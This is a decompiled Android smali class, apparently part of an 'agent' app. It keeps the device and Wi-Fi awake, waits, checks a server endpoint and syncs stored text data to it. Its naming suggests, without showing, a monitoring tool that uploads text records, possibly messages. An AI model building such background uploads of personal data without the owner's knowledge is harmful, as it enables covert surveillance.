.class public Lcom/hp/vd/module/synchronizer/text/SynchronizationRunnable;
.super Ljava/lang/Object;
.source "SynchronizationRunnable.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "TextSynchronizationRunnable"


# instance fields
.field protected context:Lcom/hp/vd/context/Context;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected textSynchronizer:Lcom/hp/vd/module/synchronizer/TextSynchronizer;


# direct methods
.method public constructor <init>(Lcom/hp/vd/module/synchronizer/TextSynchronizer;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;)V
    .locals 0

    .line 28
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 29
    iput-object p1, p0, Lcom/hp/vd/module/synchronizer/text/SynchronizationRunnable;->textSynchronizer:Lcom/hp/vd/module/synchronizer/TextSynchronizer;

    .line 30
    iput-object p2, p0, Lcom/hp/vd/module/synchronizer/text/SynchronizationRunnable;->context:Lcom/hp/vd/context/Context;

    .line 31
    iput-object p3, p0, Lcom/hp/vd/module/synchronizer/text/SynchronizationRunnable;->moduleData:Lcom/hp/vd/data/ModuleData;

    return-void
.end method


# virtual methods
.method public run()V
    .locals 8

    .line 36
    iget-object v0, p0, Lcom/hp/vd/module/synchronizer/text/SynchronizationRunnable;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 42
    iget-object v1, p0, Lcom/hp/vd/module/synchronizer/text/SynchronizationRunnable;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "power"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/os/PowerManager;

    const-string v2, "TextSynchronizationRunnable"

    const/4 v3, 0x1

    .line 43
    invoke-virtual {v1, v3, v2}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v1

    .line 44
    invoke-virtual {v1}, Landroid/os/PowerManager$WakeLock;->acquire()V

    .line 46
    iget-object v2, p0, Lcom/hp/vd/module/synchronizer/text/SynchronizationRunnable;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v4, "wifi"

    invoke-virtual {v2, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/net/wifi/WifiManager;

    const-string v4, "TextSynchronizationRunnable"

    .line 47
    invoke-virtual {v2, v4}, Landroid/net/wifi/WifiManager;->createWifiLock(Ljava/lang/String;)Landroid/net/wifi/WifiManager$WifiLock;

    move-result-object v2

    .line 48
    invoke-virtual {v2}, Landroid/net/wifi/WifiManager$WifiLock;->acquire()V

    const/16 v4, 0x14

    .line 52
    :try_start_0
    iget-object v5, p0, Lcom/hp/vd/module/synchronizer/text/SynchronizationRunnable;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v6, "wake_after_lock_acquisition"

    invoke-virtual {v5, v6}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v5
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_2

    mul-int/lit16 v4, v5, 0x3e8

    int-to-long v6, v4

    .line 54
    :try_start_1
    invoke-static {v6, v7}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_1

    .line 68
    :try_start_2
    iget-object v4, p0, Lcom/hp/vd/module/synchronizer/text/SynchronizationRunnable;->context:Lcom/hp/vd/context/Context;

    invoke-static {v4}, Lcom/hp/vd/agent/Factory;->createConnectionManager(Lcom/hp/vd/context/Context;)Lcom/hp/vd/connection/IManager;

    move-result-object v4

    .line 70
    invoke-interface {v4, v3}, Lcom/hp/vd/connection/IManager;->isEndpointAvailable(I)Z

    move-result v3

    if-nez v3, :cond_0

    const-string v3, "TextSynchronizationRunnable"

    const-string v4, "No endpoint available. Skipping Text synchronization cycle."

    .line 71
    invoke-interface {v0, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-void

    :cond_0
    const-string v3, "data"

    .line 77
    invoke-interface {v4, v3}, Lcom/hp/vd/connection/IManager;->setRequestType(Ljava/lang/String;)V

    .line 79
    iget-object v3, p0, Lcom/hp/vd/module/synchronizer/text/SynchronizationRunnable;->context:Lcom/hp/vd/context/Context;

    .line 80
    invoke-virtual {v3}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v3

    invoke-virtual {v3}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getConnectionSource()Lcom/j256/ormlite/support/ConnectionSource;

    move-result-object v3

    new-instance v5, Lcom/hp/vd/module/synchronizer/text/SynchronizationCallable;

    iget-object v6, p0, Lcom/hp/vd/module/synchronizer/text/SynchronizationRunnable;->textSynchronizer:Lcom/hp/vd/module/synchronizer/TextSynchronizer;

    iget-object v7, p0, Lcom/hp/vd/module/synchronizer/text/SynchronizationRunnable;->context:Lcom/hp/vd/context/Context;

    invoke-direct {v5, v6, v7, v4}, Lcom/hp/vd/module/synchronizer/text/SynchronizationCallable;-><init>(Lcom/hp/vd/module/synchronizer/TextSynchronizer;Lcom/hp/vd/context/Context;Lcom/hp/vd/connection/IManager;)V

    .line 79
    invoke-static {v3, v5}, Lcom/j256/ormlite/misc/TransactionManager;->callInTransaction(Lcom/j256/ormlite/support/ConnectionSource;Ljava/util/concurrent/Callable;)Ljava/lang/Object;
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_0

    :catch_0
    move-exception v3

    const-string v4, "TextSynchronizationRunnable"

    const-string v5, "run(): excetion caught."

    .line 87
    invoke-interface {v0, v4, v5, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_0
    if-eqz v1, :cond_1

    .line 95
    invoke-virtual {v1}, Landroid/os/PowerManager$WakeLock;->release()V

    :cond_1
    if-eqz v2, :cond_2

    .line 100
    invoke-virtual {v2}, Landroid/net/wifi/WifiManager$WifiLock;->release()V

    :cond_2
    return-void

    :catch_1
    move-exception v1

    move v4, v5

    goto :goto_1

    :catch_2
    move-exception v1

    :goto_1
    const-string v2, "TextSynchronizationRunnable"

    .line 57
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Could not wait after lock (wakeLock, wifiLock) acquisition for "

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v4, ". Possible update() in progress ?"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void
.end method
